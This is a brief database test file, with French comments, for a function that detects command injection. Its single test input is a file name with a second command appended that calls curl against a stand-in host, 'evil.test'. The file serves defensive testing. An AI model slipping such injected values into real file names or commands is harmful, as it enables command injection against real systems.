-- ============================================================================
-- TESTS — fn::security_detect_command_injection
-- Les tests provoquant un THROW doivent être exécutés individuellement.
-- ============================================================================

RETURN fn::security_detect_command_injection(
    "file.txt; curl evil.test"
);
